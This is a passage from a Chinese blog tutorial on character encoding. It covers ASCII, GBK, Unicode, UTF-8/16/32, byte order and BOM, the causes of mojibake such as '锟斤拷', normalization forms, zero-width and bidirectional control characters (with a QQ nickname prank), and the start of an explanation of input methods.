总算做完了，这套题是处处透露着诡异，个别题目意义不明，难度两极分化，选择题太多，根据选项才能得到结果，不根据选项又白白浪费提示，要绕很大一圈\n不过整体来说过程还是很清楚的，好玩还是挺好玩，故事挺有带入感的\n","date":"2025-08-15T21:32:09+08:00","image":"http://picture.928330.xyz/typora/638b75a2d7286.jpg","permalink":"https://blog.928330.xyz/p/%E7%BE%8E%E4%BA%9A%E6%9D%AF2022%E4%B8%AA%E4%BA%BA%E8%B5%9B%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/","title":"美亚杯2022个人赛取证总结"},{"content":"在计算机的世界里，我们看到的所有内容 —— 无论是文字、符号还是表情 —— 本质上都是一串串由0和1组成的二进制数字\n那么一个我们能看懂的、有意义的符号，是如何被计算机存储，又是如何被准确无误地显示出来的呢？\n这个过程就是我们今天要讲述的关于“字符”的完整故事\n基础概念：字符、字形、字节与字 要理解后续的一切，我们必须先精确区分几个最基本的概念：\n抽象的语义单位 —— 字符（Character） 具象的视觉单位 —— 字形（Glyph） 计算机的物理存储单位 —— 字节（Byte） 以及容易混淆的“字”——计算机的字（Word） 与 人类语言的字 字符（Character） 字符，是一个抽象的、信息的基本语义单元，是我们用来表达意义的最小符号\n英文字母A、b、c是字符\n数字1、2、3是字符\n标点符号.、?、!是字符\n汉字中、国、人是字符\n表情符号😂、👍也是字符！\n在这个层面，字符是无形的，它只关乎“是什么”，而不关乎“长什么样”或“如何存储”\n字形（Glyph） 字形，是字符的具体视觉表现形式，是我们真正在屏幕上看到的那个“形状”\n一个字符可以有多种不同的字形：\n字符“拉丁字母A”可以有 A (正常), A(粗斜体), 𝔸 (空心) 等多种字形 同一个汉字“骨”，在宋体、楷体、草书中的字形也完全不同。 反过来，多个字符也可能组合成一个字形（这被称为“合字”或“连字”，Ligature）：\n在某些英文字体中，字符 f 和 i 相邻时，会合并成一个单独的 ﬁ 字形，以避免 f 的钩与 i 的点碰撞。 简单说：字符是“骨”，字形是“皮肉”。我们操作和存储的是字符，而最终渲染出来给人看的是字形。\n字节（Byte） 字节，是计算机中数据存储和处理的基本单位\n一个字节由8个比特（bit）组成，每个比特非0即1 一个字节能表示2⁸=256种不同的状态（0-255） 字（Word） 计算机的“字”与人类的“字”毫无必然联系\n计算机中的“字”（Word） 在计算机科学中，字（Word）是CPU处理数据的自然单位，是计算机一次性读取、处理或传输的最小数据块\n字的大小依赖于计算机架构：\n16 位系统的一个字是 2 个字节（16 位） 32 位系统的一个字是 4 个字节（32 位） 64 位系统的一个字是 8 个字节（64 位） 在汇编语言和系统底层编程中，“字”是非常重要的基本数据宽度概念\n人类语言中的“字” 在人类语言里，“字”指的是一个书写符号单位：\n在中文里，“字”通常是一个汉字，例如中、国 在英文里，没有严格对应的“字”概念，通常用letter（字母）或word（单词）描述 在日语里，一个“字”可能是汉字、平假名、片假名中的任意一个符号 在大多数情况下，人类语言里的“字”可以看作是一个字符，但它们并不是严格等同的概念\n我们可以认为一个英语单词是一个“字”，但它却是多个“字符”的组合\n那么此时，矛盾就出现了：\n世界上有成千上万个抽象的“字符”，而计算机的基本存储单元“字节”一次只能表示256种状态！\n这就需要建立一套完整的映射体系，才能让所有字符都能在计算机上显示\n字符集 为了让计算机能够处理字符，人们首先需要做一件事：\n把世界上所有的字符收集起来，排个队，给每个字符分配一个独一无二的编号\n字符集，就是这样一个“字符的集合”以及“字符与编号的对应表”。可以把它想象成一本为全世界所有字符编写的巨大“字典”，而对应的编号，我们称之为码点\n字符集本身只是一套标准、一个“名册”，它只规定了“哪个字符对应哪个数字”，但还没有规定这个数字具体应该如何在计算机中用字节来存储\n字符集的历史演进与兼容性问题 ASCII时代 计算机诞生于美国，最早的ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）字符集是为英语环境量身定做的\n它收录了128个最常用的字符，包括：\n95个可打印字符：大小写英文字母（A-Z, a-z）、数字（0-9）、以及各种标点和符号（!,@,#等）\n33个不可打印的控制字符：如回车（CR）、换行（LF）、制表符（Tab）等，用于控制打印机等设备\n它的码点范围是0到127，所以用一个字节（0-255）来存储一个ASCII 字符绰绰有余\n实际上，ASCII码只用到了一个字节（8个比特）中的低7位，最高位始终为0\n例如，字符'A'的码点是 65，其二进制表示为01000001\n这个“最高位为0”的特性，为后来的扩展埋下了伏笔\nASCII码现在依然在被广泛使用，你可以在很多编程语言里面见到它，而且可以说它是现代字符编码体系的根基\n地区性字符集时代 当计算机走向世界，问题出现了：\n欧洲需要 é, ü，中国需要汉字，日本需要假名，单一的 ASCII 远远不够用！\n于是，世界各地纷纷利用ASCII留下的“遗产”—— 那个未被使用的最高位比特0，来扩展自己的字符集\n当一个字节的最高位是0时，它仍然表示一个标准的ASCII字符\n当最高位是1时，它就进入了各个地区自定义的“扩展区”（码点范围 128-255）\n下面是一些比较有代表性的编码方案吗，我们后面还会详细说明：\nISO-8859-1 (Latin-1)\n面向西欧，它利用了128-255的码点来表示带音标的字母，如é、ü、© 等\nGB2312/GBK\n面向中国大陆，由于汉字数量远超128个，它采用双字节编码方案\n当检测到一个字节的最高位是1时，就认为它和紧随其后的下一个字节共同表示一个汉字\nGBK 是 GB2312 的扩展，收录了更多汉字\nBIG5\n面向中国台湾地区，同样是双字节方案，用于表示繁体字\nShift_JIS\n面向日本，是一个更复杂的变长编码方案，用于表示日文汉字和假名\n虽然这样方便了各个地区的用户，但也是之后乱码问题出现的罪魁祸首\nUnicode时代 为了终结大家各用各的这种混乱，Unicode应运而生\n它的目标是“天下书同文”，它不是要创造又一个与其它标准竞争的字符集，而是要统一和包容所有字符！\n也就是说，它要为地球上每一种语言的每一个字符都分配一个全球唯一的码点！\n这一伟大的工程应该造福了全人类·，所以我们也叫他统一码/万国码\nUnicode码点的标准表示方法是用U+十六进制数字来表示：\n汉字中 的Unicode码点是U+4E2D 表情😂 的Unicode码点是U+1F602 你也可能看到另一种方法：\\u+十六进制数字，这是编程语言中的转义字符表示法：\n汉字中 的Unicode转义字符是\\u4E2D 表情😂 的Unicode转义字符是\\u1F602 如何存储如此庞大的字符量呢？\nUnicode标准码点范围是从U+0000到U+10FFFF，共计约1,114,112个码点\n这些码点被划分成17 个平面（Planes），每个平面包含65536（即 2¹⁶）个码点：\n基本多文种平面（BMP, Plane 0）\n包含了从U+0000到U+FFFF的码点，涵盖了世界上绝大多数常用字符，包括常用汉字\n辅助平面（Supplementary Planes, Plane 1–16）\n包含了从U+010000到U+10FFFF的码点，用于表示生僻字、古代文字以及各种符号，比如Emoji表情\n从此，无论在哪个国家、哪个平台，U+4E2D永远只代表中这一个字符\n字符集标准组织 制定这些标准的是一些国际组织，其中最重要的是：\nUnicode联盟（Unicode Consortium）\n一个非营利组织，其成员包括苹果、谷歌、微软、Adobe等各大科技巨头。它负责开发、维护和推广Unicode标准，包括我们日常使用的Emoji表情的标准化\n国际标准化组织（ISO）\n它也发布了与Unicode对应的 ISO/IEC 10646 标准，基本上可以认为Unicode和 ISO/IEC 10646 是同一个字符集标准的不同名称\n至此，我们通过字符集，成功地将所有抽象的字符转化为了全球统一的数字（码点）\n一个极其重要的问题：\nUnicode本身只定义了码点，它并没有规定这个号码在计算机中应该如何用字节来存储！\n编码 现在我们有了“字符”和“码点”的对应关系（字符集），但还有一个最关键、最实际的问题没有解决：\n如何将这些码点（数字），特别是那些大于 255 的庞大数字，高效地用计算机唯一懂的语言来表示？\n答案是编码 —— 将字符的码点（数字）翻译成字节序列（物理存储）的具体规则\n如果说字符集是字典，那编码就是语法规则，它教我们如何用字节来书写字典里的每一个页码（码点）\n编码格式 在编程领域，为了处理非ASCII字符，历史上形成了两种截然不同的解决思路\n多字节字符集 (MBCS - Multi-byte Character Set) 这是一种“让程序变聪明”的编码层面解决方案\n字符串在内存中仍然以char数组的形式存放，但程序在处理时，必须“意识到”这个字节序列采用了某种特定编码（如 GBK）\n比如，对于C语言字符串 \u0026quot;你好\u0026quot;，在GBK编码下，它占4个字节\nstrlen(\u0026quot;你好\u0026quot;)会返回4，因为它只认识字节 而一个特殊的、能识别多字节的函数mbstrlen(\u0026quot;你好\u0026quot;)则会返回2，因为它知道两个字节才构成一个汉字 这种方式处理起来非常复杂且极易出错，因为我们不能再想当然地通过str[i]来访问第i个字符 —— str[i]可能只是一个汉字的前半部分！字符串的截取、遍历和修改都变得困难了！\n宽字符 (Wide Character) 这是一种“让数据类型变强大”的数据类型层面解决方案\n它不再让程序去适应复杂的字节流，而是定义了一个新的、足够宽的数据类型，这个类型通常是2或4个字节\n比如我们在C++中定义一个这样的宽字符wchar_t类型：\nwchar_t* wide_str = L\u0026#34;你好\u0026#34;; wide_str数组的每个元素都能完整地存放一个字符的码点，而L前缀告诉编译器，这个字符串用宽字符存储，不是普通的char字符串\nwide_str[0]就是字符你，wide_str[1]就是字符好，数组长度为2\n这让字符串的索引和遍历恢复了简单\n他也有不少缺点：\n空间浪费\n即使是存储纯英文 \u0026ldquo;hello\u0026rdquo;，每个字符也要占用2或4个字节，造成空间浪费\n跨平台困难\n虽然很难以置信，但wchar_t的具体大小在不同主流操作系统上并不统一！\n在 Windows 上它通常是 2 字节（对应 UTF-16），而在 Linux 和 macOS 上它通常是 4 字节（对应 UTF-32），这使得依赖 wchar_t 的代码难以跨平台移植！\n+++\n正是因为这两种早期方案都有明显的缺陷，现代编程实践大多推荐直接使用UTF-8编码的普通char字符串，并配合专门、可靠的库（如 ICU）来处理复杂的字符串操作\n至于什么是UTF-8编码，我们接着往下看\n编码方式 ASCII编码 最简单的编码，码点值就是字节值\n字符'A'的码点是 65，其编码就是一个值为 65 的字节\nGBK编码 GBK的全称是国标扩展码拼音“Guóbiāo Kuòzhǎn”的缩写\n这是一种典型的多字节编码（MBCS），解码时检查一个字节的最高位：\n如果为0（0-127），则它本身就是一个单字节的ASCII字符 如果为1（128-255），则它必须和紧随其后的下一个字节共同组成一个双字节的汉字 UTF-8编码（现代标准） 这是现代互联网的基石，它是一种针对Unicode的、可变长度的字符编码，其设计堪称精妙绝伦\n它兼容ASCII编码：对英文字母和数字用1个字节编码，与ASCII完全一样，这意味着一个纯英文的ASCII文件，本身就是一个合法的UTF-8文件，无需任何转换\n它对不同字符有不同字节规定：对拉丁文、希腊文用2字节；对常用汉字用3字节；对罕见字符和表情用4字节\nUTF-8通过每个字节开头的几个比特来标记这个字符的长度：\n0xxxxxxx: 单字节，表示U+0000到U+007F(ASCII) 110xxxxx 10xxxxxx: 双字节，由一个110开头的字节和个10开头的字节组成 1110xxxx 10xxxxxx 10xxxxxx: 三字节，由一个1110开头的字节和两个10开头的字节组成 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx: 四字节 具体对应关系如下：\nUnicode 范围 (十六进制) UTF-8 字节序列 (二进制) 字节数 常见语言/用途举例 U+0000 - U+007F 0xxxxxxx 1 英语（基本拉丁字母）、数字、ASCII 标点、控制字符 U+0080 - U+07FF 110xxxxx 10xxxxxx 2 拉丁文扩展（é ñ 等）、希腊文、俄语西里尔字母、希伯来文、阿拉伯文 U+0800 - U+FFFF 1110xxxx 10xxxxxx 10xxxxxx 3 东亚文字（中文、日文假名、韩文音节）、越南文、泰文、天城文（印地语等）、大部分表情符号 U+10000 - U+10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 4 罕见/扩展字符（CJK 扩展汉字、古代文字、乐谱符号、更多表情符号） 这些x是实际用来填充字符码点二进制位的地方，从右向左、从低位到高位填充\neg：汉字“中” (U+4E2D)\nUnicode 码点：U+4E2D 范围：4E2D在U+0800 - U+FFFF之间，所以需要 3 个字节 二进制表示：4E2D的二进制是0100 1110 0010 1101 (16位) 匹配模板：三字节模板是1110xxxx 10xxxxxx 10xxxxxx。这个模板共有4+6+6=16个x，正好容纳16位 填充 最右边的6个x填入最低的6位：001101 中间的6个x填入接下来的6位：111000 最左边的4个x填入最高的4位：0100 得到字节序列 1110 0100 -\u0026gt; E4 10 111000 -\u0026gt; B8 10 001101 -\u0026gt; AD 结果：汉字“中”的UTF-8编码是**E4 B8 AD** 这种设计确保了程序在任何位置开始读取字节流，都能准确判断出一个字符的起始和结束边界\nUTF-16 编码 UTF-16也是一种用于编码Unicode字符的格式\n它通常使用2个字节（对于BMP内的字符）或4个字节（对于辅助平面的字符）来表示一个字符\n由于其大部分情况下定长的特性，便于程序内部进行索引，因此被广泛用作许多系统和语言的内部内存表示，例如Windows操作系统内核、Java语言的String类型\nUTF-32 编码 类似UTF-16，它也是定长的，为每一个字符分配固定的4个字节（32位）来存储其Unicode码点值\n它和UTF-16一样，在文件存储和网络传输方面不如UTF-8流行，一个主要原因就是接下来要讲的字节序问题\n字节序 当一个字符需要用多个字节来表示时，就必须面对一个问题：\n这些字节应该按什么顺序存储？就像写数字258，是从左到右写 2, 5, 8，还是从右到左写8, 5, 2？\n这也就是所谓的字节序 —— 多字节数据在内存或文件中按字节排列的顺序\nUTF-8的编码规则中，字节内部的位顺序是固定的，没有所谓“高字节”和“低字节”的问题；而UTF-16和UTF-32是定长的，而且字节内部可以交换顺序，所以会有字节序区别\n常见的两种字节序：\n大端序 (Big-Endian, BE)：高位的有效字节存放在内存的低地址（大头在前）\n这符合人类的阅读习惯\n小端序 (Little-Endian, LE)：低位的有效字节存放在内存的低地址（小头在前）\n这在 x86 架构的计算机（我们日常使用的大多数 PC）中更为常见\n比如，字符 中的UTF-16编码 (U+4E2D) 是两个字节4E和2D：\n在大端序系统上，内存中存储为：... [地址1000]: 4E, [地址1001]: 2D ... 在小端序系统上，内存中存储为：... [地址1000]: 2D, [地址1001]: 4E ... 如果搞错了字节序，解码就会出错！\n为了解决这个问题，人们发明了BOM(Byte Order Mark)，它是一个放在文件开头的、不可见的特殊暗号字符（码点为 U+FEFF）\n通过读取文件开头的几个字节，以BOM为参考，程序就可以判断文件的字节序和编码：\n如果文件开头是FE FF，说明是UTF-16 大端序 如果文件开头是FF FE，说明是UTF-16 小端序 如果文件开头是EF BB BF，说明是UTF-8 正如前面所说，UTF-8本身没有字节序问题，它的BOM只是用来表明这是一个UTF-8文件\n然而，在Web开发和类Unix系统中，普遍推荐使用不带 BOM 的 UTF-8（UTF-8 without BOM），因为某些旧的脚本和工具可能不认识 BOM，并将其作为垃圾内容输出，导致页面顶部出现空行或其他问题\n理解了前面的字符集和编码，乱码的产生原因就非常清晰了\n乱码 乱码的唯一根源在于：用 A 编码方式存储的字节序列，却被当作 B 编码方式去解码和显示。\n这就像你拿到一份用中文密码本加密的信息，却错误地拿了一本俄文密码本去解密，结果自然是一堆谁也看不懂的天书\n字节本身是无辜的，它们只是一串0和1，真正的罪魁祸首是解码时错误的假设\n错误的翻译 —— GBK打开UTF-8文件 这是最常见的场景：我们用国际标准的UTF-8创建了文件，但它被一个只认识本地编码的旧程序打开了\n我们用 Python 写入一句话“你好，世界”，并明确使用utf-8编码保存，查看它UTF-8编码字节\ntext = \u0026#34;你好，世界\u0026#34; utf8_bytes = text.encode(\u0026#39;utf-8\u0026#39;) with open(\u0026#34;utf8.txt\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(utf8_bytes) print(utf8_bytes.hex().upper()) 输出：\nE4BDA0E5A5BDEFBC8CE4B896E7958C 我们再模拟一个旧程序用gbk编码去读取这个hello_utf8.txt文件：\nwith open(\u0026#34;utf8.txt\u0026#34;, \u0026#34;rb\u0026#34;) as f: byte_data = f.read() #errors=\u0026#39;replace\u0026#39; 表示遇到无法解码的字节时，用 \u0026#39;\u0026#39; 替换 garbled_text = byte_data.decode(\u0026#39;gbk\u0026#39;, errors=\u0026#39;replace\u0026#39;) print(garbled_text) 输出：\n浣犲ソ锛屼笘鐣� 这就是典型的乱码，因为utf-8下的E4BDA0...这串字节在GBK的字典里恰好对应了另一组完全不同的汉字\n“锟斤拷” 这个著名的乱码组合，就是源于将UTF-8编码的汉字，错误地用 GBK 或其他本地编码来显示\n它的成因非常特殊，它源于对“错误”本身的再次错误解读\n替换字符 这个故事的主角，是一个特殊的Unicode字符 —— 替换字符\n当一个程序在解码字节流时，如果遇到了一个不符合当前编码规则的、无法识别的无效字节序列，该怎么办？\n一个设计良好的程序不会崩溃，而是会遵循Unicode标准，在那个出错的位置插入一个官方的替换字符，也就是**U+FFFD**，它在屏幕上通常显示为一个黑色的菱形中间带一个问号\n错误的诞生 现在，让我们用代码来模拟它的产生过程：\n假设一个程序（比如数据库、文本编辑器等）在处理数据时，遇到了它无法理解的字节，作为安全措施，程序在内存中生成了两个Unicode替换字符，我们在Python中可以直接用它的码点 \\uFFFD 来表示：\nerror_text = \u0026#34;\\uFFFD\\uFFFD\u0026#34; 接下来，程序将包含这两个替换字符的字符串，以标准的UTF-8格式写入文件，一个U+FFFD的UTF-8编码是 3个字节：EF BF BD\nutf8_error = error_text.encode(\u0026#39;utf-8\u0026#39;) 现在，另一个程序（或用户）错误地使用 GBK 编码来读取这串字节，注意这里必须用 gbk 编码，如果用 gb2312会因字符不全而报错：\ntext = utf8_error.decode(\u0026#39;gbk\u0026#39;) print(f\u0026#34;GBK解码结果: \u0026#39;{text}\u0026#39;\u0026#34;) 结果：\n锟斤拷 其中过程是怎么样的？\n程序读取 EF BF BD EF BF BD这6个字节 GBK 解码器按两个字节一组来处理，因为它认为最高位是 1 的字节都是双字节字符的一部分： 读到**EF BF，去查GB码表，这对字节恰好对应了汉字锟** 接着读到**BD EF，再次去查GBK码表，这对字节也恰好有对应汉字斤** 最后读到**BF BD，第三次去查GBK码表，这对字节同样对应了一个汉字拷** 就这样，原本代表解码错误的、在UTF-8下有明确含义的字节序列，在 GBK解码器的一系列巧合误解之下，被翻译成了我们在座各位都无比熟悉的三个汉字——锟斤拷 锟斤拷是传播比较广泛的乱码，真正的乱码形式多种多样，网上有人整理了常见的乱码对照表：\n如果你不记得什么是ISO-8859-1：地区性字符集时代 表里面提到锟拷码是gbk读取两次的结果，其实就是utf-8 -\u0026gt;错误字符 -\u0026gt; 替换字符 -\u0026gt; 锟斤拷\n无能的编码检测 既然乱码是因编码不匹配产生的，那程序能自动检测文件的编码吗？\n答案是可以，但永远不可靠\n编码检测本质上是一种启发式猜测，线索极少\n程序会读取一部分字节，然后用各种常见编码的规则去试，并根据以下线索进行打分：\nBOM (Byte Order Mark)\n这是最可靠的线索，如果文件开头有EF BB BF，那几乎可以100%确定是UTF-8\n但我们上面也说过了，绝大多数文件（特别是网页）为了兼容性，并不带BOM\n无效字节序列\n编码有其严格的字节组合规则，如果在尝试用GBK解码时，出现了大量不符合其双字节规则的序列（像上面例子中的单个0xAA），那么程序就会认为这可能不是GBK\n统计学特征\n分析字节的分布规律，例如，一段英文文本如果用UTF-8编码，大部分字节都会在0-127范围内。而一段中文GBK文本，则会出现大量连续成对的大于127的字节\n然而，这种方法是不可靠的：\n对于短文本，样本太少，统计学方法完全失效\n巧合时有发生，有些字节序列在多种编码下恰好都是“合法”的，只是代表的意义不同\n在早期的windows版本中，如果使用写字板打开txt文件，输入“联通”两个字，此时是以GBK形式保存，但由于他们的编码恰好和utf-8的双字节格式相同（比如“联”是C1 AA，即11000001 10101010），阅读器错误的使用utf-8解码它们，就会导致乱码\n还有一个著名的例子就是短语Bush hid the facts，这也是一个在中文Windows系统上曾广为人知的文本显示乱码，当它以ASCII/UTF-8保存后，如果被程序错误地当作UTF-16LE来打开，会显示出几个汉字联 আরি󏐠或类似乱码\n所以，永远不要依赖自动检测！\n与其让接收方去费力猜测，不如让发送方在明确标注语言，现代协议和格式都会提供这种明确指定编码的机制\n例如：\nHTTP响应头：服务器在返回网页时，通过这个头信息告诉浏览器用什么编码来解析\nContent-Type: text/html; charset=utf-8 HTML文件头：在HTML文件内部，通过meta标签再次声明编码，作为服务器未发送上述头信息时的备用方案\n\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; XML文件头：XML文件在第一行就声明自己的编码\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; 说完了基础的，我们来说点高级的 —— 其实，Unicode远比“一个码点一个字”要复杂\n除了我们看得见的字符，还存在一套系统，用于处理字符的等价性问题、组合显示以及控制文本的复杂行为\n字符的变形 同形异义 同一个看起来一样的字符，在Unicode中可能有多种表示方式，这在计算机看来就是完全不同的东西\n比如一个带扬抑符的字母é，它就有两种表示方式：\n方式1 —— 预组合\n直接使用单个码点 U+00E9（é），就像一个现成的汉字一样\n方式2 —— 组合\n使用普通字母e（U+0065），后面紧跟一个“组合扬抑符” ´（U+0301）\n这就像汉字的一个偏旁部首，会自动“贴”到前一个字母的身上，组合成需要的样子\n这两种方式渲染出来的字形完全一样，但在计算机内部，它们的身份是完全不同的\n如果你在一个文本中搜索 U+00E9，将无法匹配到由U+0065 + U+0301组成的那个é\n历史渊源 你可能会奇怪为什么它会以两种方式存在，这其实和Unicode在设计时要兼顾的两个目标有关：\n兼容性 在 Unicode 出现之前，许多老字符集（如 Latin-1）已经有é这种“预组合”的单个字符\n为了兼容旧标准，Unicode 直接收录了这些单字符形式（U+00E9）\n可组合性 Unicode 希望支持所有语言的所有字符变化（比如加不同的重音、附加符号、数学标记等），但如果每种变化都单独收一个码点，字符集会无限膨胀\n所以，Unicode 定义了组合字符（Combining Characters）机制，允许用一个基本字母 + 一个或多个附加符号来动态组合成新字形（比如U+0065+U+0301）\n归一化标准 为了解决这个问题，Unicode 定义了四种归一化标准，用于将“看起来一样但编码不同”的字符串转换为统一的、规范的表示形式\nNFC (Normalization Form C – Composition)：组合\n先将字符分解，再尽可能组合为预组合形式（比如 e + ´ → é）\n这是 W3C 推荐在网页存储和传输中使用的标准，能够保证跨平台一致性\nNFD (Normalization Form D – Decomposition)：分解\n将字符尽可能分解为基本字符和组合标记（比如 é → e + ´）\n这种形式常用于需要分析字符结构或对附加符号单独处理的场景\nNFKC (Normalization Form KC – Compatibility Composition)：兼容性组合\n在NFC的基础上，先进行兼容性分解（把全角字符、特殊样式字符等转换为标准字符），再尽可能组合\n例如，Ｈｅｌｌｏ（全角）会被转成Hello\n适合搜索、匹配、用户输入标准化等场景\nNFKD (Normalization Form KD – Compatibility Decomposition)：兼容性分解\n在NFD的基础上，额外进行兼容性分解，将外观差异但语义等价的字符统一为标准形式，并保持分解状态\n例如，罗马数字 Ⅳ 会被分解为 I + V\n常用于文本分析、去除装饰性差异等任务\n前两种是比较常用的归一化方式\n特殊字符 Unicode中包含很多“看不见”但有特殊功能的字符，我们上面提到的用作BOM的就是其中一种\n零宽字符 看不见的字符 它们不占用任何宽度，肉眼不可见，但能产生特殊效果\n零宽空格 (ZWSP, U+200B)\n它用于在长单词或 URL 的中间建议一个“可以换行”的位置，而不会产生一个可见的空格\n例如，在 URL thisisaverylongurlthatmightoverflow 中间插入 ZWSP，当容器宽度不够时，浏览器就可以在这里优雅地换行，而不会破坏链接\n零宽连字 (ZWJ, U+200D)\n它用于“粘合”两个独立的字符，告诉渲染引擎将它们显示为一个组合的字形\n最著名的应用就是 Emoji 的组合： 👨 (男人) + ZWJ + 👩 (女人) + ZWJ + 👧 (女孩) + ZWJ + 👦 (男孩) = 👨‍👩‍👧‍👦 (家庭) ‍ (零宽连字) 本身不可见，但它像胶水一样把前后四个独立的 Emoji 粘合成了一个新的 Emoji\n零宽非连字 (ZWNJ, U+200C)\n与 ZWJ 相反，它用于“切断”本应自动连接的字符\n例如，在波斯语中，某些字母会自动与后面的字母连接，插入 ZWNJ 可以强制它们断开，以显示其非连接形式\n从左到右标记 (LRM, U+200E)\n一个不可见字符，用来强制后续字符以从左到右显示\n常用于混合方向文本中，确保英文或数字按正常方向显示。例如，在阿拉伯语句子中插入 LRM 可以保证英文单词正常显示。\n从右到左标记 (RLM, U+200F)\n类似 LRM，但强制后续字符以从右到左方向显示\n常用于拉丁字母或数字出现在阿拉伯语或希伯来语文本时，保证它们正确的右到左排列\n从左到右嵌入 (LRE, U+202A)\n它开始一段左到右的文本嵌入，后续字符强制从左到右显示，直到遇到对应的结束符\n在主要是阿拉伯语的文本中插入LRE和PDF，可让一段英文保持左到右排列\n从右到左嵌入 (RLE, U+202B)\n它开始一段右到左的文本嵌入，后续字符强制从右到左显示，直到遇到结束符\n在主要为英文的文本中插入RLE和PDF，使其中一段希伯来语正常右到左排列\n弹出方向格式 (PDF, U+202C)\n它用来结束先前的方向嵌入（LRE或RLE），恢复之前的文本方向\n例如：文本中出现LRE\u0026hellip;PDF或RLE\u0026hellip;PDF包裹的区域，PDF结束该嵌入状态\n从左到右覆盖 (LRO, U+202D)\n它强制后续字符全部以从左到右方向显示，覆盖其默认方向，直到遇到PDF\n例如：在包含阿拉伯语或希伯来语的混合文本中，强制某一部分以从左到右显示\n从右到左覆盖 (RLO, U+202E)\n与LRO相反，强制后续字符全部以从右到左方向显示，覆盖默认方向，直到遇到PDF\n这在恶意文本或混淆攻击中经常被用来制造视觉欺骗，因它会反转文字显示方向\n不可见乘号 (INVISIBLE TIMES, U+2062)\n表示数学隐式乘法操作，但不显示任何符号，常用于数学公式排版，变量间的隐式相乘\n不可见分隔符 (INVISIBLE SEPARATOR, U+2063)\n用作文本逻辑分隔符，但不显示任何空白或符号，方便文本内部逻辑处理\n零宽不间断空格 (ZWNBSP, U+FEFF)\n既是零宽的不可换行空格，也常用于Unicode文档的字节顺序标记（BOM）\n在文件开头可标识文本编码，但不应随意插入文本中，以免引起显示问题\nQQ的反转id 相信不少人都看见过qq群里有些人的id后面会跟着一个“喵”之类的恶搞字符\n当你@他时，这个字符竟然脱离了id，出现在了我们输入的话后面！这怎么回事？\n其实这就是使用了上面我们提到的零宽字符的两种：\nU+202E：从右至左覆盖 U+202D：从左至右覆盖 比如，我有一个id是这样的：\n快来艾特我\\u202E喵~\\u202D 因为是不可见字符，在别人眼里是看不见的（需要使用对应的编码工具，比如：unicode编码转换 ）：\n快来艾特我喵~ 当别人@我发言的时候（比如说“你好”，显示应该是@快来艾特我喵 你好），文字显示默认从左向右\n我们使用[]代表当前输入光标的位置，左右箭头代表输入方向：\n[]→ @[]→ @快[]→ @快来[]→ @快来艾[]→ @快来艾特[]→ @快来艾特我[]→ 读取到这里的时候，文本框看见了控制字符U+202E，它立刻变成了从左向右输入：\n@快来艾特我←[] @快来艾特我←[]喵 输入“喵”后，他又看见了控制字符U+202D，又变回了从右向左输入：\n@快来艾特我[]→喵 @快来艾特我你[]→喵 @快来艾特我你好[]→喵 输入完成之后最终效果：\n@快来艾特我你好喵 这就让别人喵喵叫啦\n零宽字符隐写 这种零宽字符还诞生了一种隐写方式 —— 零宽字符隐写（Zero-Width Character Steganography）\n隐写技术通过在正常文本的字符间插入零宽字符，或者利用不同零宽字符的组合，来编码隐藏信息\n例如，用零宽空格代表二进制的0，零宽非连接符代表1，或者通过插入或不插入零宽字符表示二进制位\n这样，隐藏的信息不会被普通阅读者察觉，因为文本外观没有变化\n你可以使用linux的vim编辑器打开，观察到\\u这样的隐写痕迹\n常用的隐写工具：\nhttps://330k.github.io/misc_tools/unicode_steganography.html https://yuanfux.github.io/zero-width-web/ 变体选择符 变体选择符是一类特殊的Unicode码点，通常紧跟在另一个字符后面，作用是“建议”或“指定”该字符的具体显示样式（字形变体），以保证不同平台或字体能正确显示\n常见变体选择符：\nU+FE0E（VS15，Variation Selector-15）表示文本形式，提示字符以普通文本风格显示 U+FE0F（VS16，Variation Selector-16）表示表情符号形式，提示字符以彩色Emoji风格显示 比如，Unicode字符U+2764是一个“心形”符号 ❤：\n单独使用：U+2764，显示可能是黑白符号，也可能是彩色Emoji，这依赖平台和字体 加上变体选择符：U+2764 U+FE0F，强制显示为彩色Emoji❤️ 加上变体选择符：U+2764 U+FE0E，强制显示为黑白文本 ❤︎ 讲了这么多，终于到实践的部分了\n到目前为止，我们讨论的都是计算机如何“理解”和“存储”字符\n现在，我们来看看在实际操作中，人类是如何与这个复杂的字符系统进行交互的\n工具与应用 输入法（Input Method Editor, IME） 输入法并非一个普通的应用程序，而是一个专为文本输入设计的、集成在操作系统中的系统级服务或中间件\n它的位置恰好位于物理键盘和当前聚焦的应用程序之间，为了让输入法能够“拦截”和“处理”按键，所有现代操作系统都提供了专门的框架来管理和集成它们：\nWindows: 文本服务框架 (Text Services Framework, TSF)\n这是一个先进的框架，允许输入法、手写识别、语音识别等多种文本服务以统一的方式与应用程序交互\n在早期，Windows使用的是一个较老的系统，名为输入法管理器 (Input Method Manager, IMM)\nmacOS: Input Method Kit\n这是苹果为开发者提供的、用于构建输入法的官方框架\nLinux: IBus (Intelligent Input Bus) \u0026amp; Fcitx (Flexible Context-aware Input Tool for X)\n它们都采用了一种“总线”式的架构，输入法作为服务挂载在总线上，为所有应用程序提供输入服务\n这些框架的核心作用，就是建立一套标准的通信协议，确保任何应用程序（只要它支持该框架）都能与任何输入法进行顺畅的对话，而无需关心对方的具体实现\n当我们在键盘上敲下字母到最终输入文字，经历了什么？\n我们以输入“你好”为例，一步一步看看它的过程：\n步骤一：事件拦截 物理按键触发\n当我们按下n键时，键盘硬件会将该按键对应的扫描码（Scan Code） 通过键盘控制器发送到计算机\n这只是一个硬件级的信号，还不知道“n”是什么意思\n操作系统接收与封装事件\n操作系统的输入子系统（如 Windows 的 Keyboard Class Driver、Linux 的 evdev）接收到扫描码，将其转换成虚拟键码\n这一阶段还只是“按下了哪个键”的信息，不涉及语言文字\nIME 输入法拦截\n在操作系统将键盘事件传递给当前活动应用程序（比如聊天窗口）之前，事件会先经过输入法框架\n如果当前有 IME 处于激活状态，它会拦截并消费这个按键事件 —— 这意味着这个按键不会直接传给应用，而是先进入输入法的内部处理逻辑\n建立输入上下文\nIME会根据当前的焦点控件（例如一个可编辑文本框）建立一个输入上下文，用来记录本轮输入的状态：\n已输入的编码（例如拼音串nihao） 光标位置 候选词列表 用户选择历史 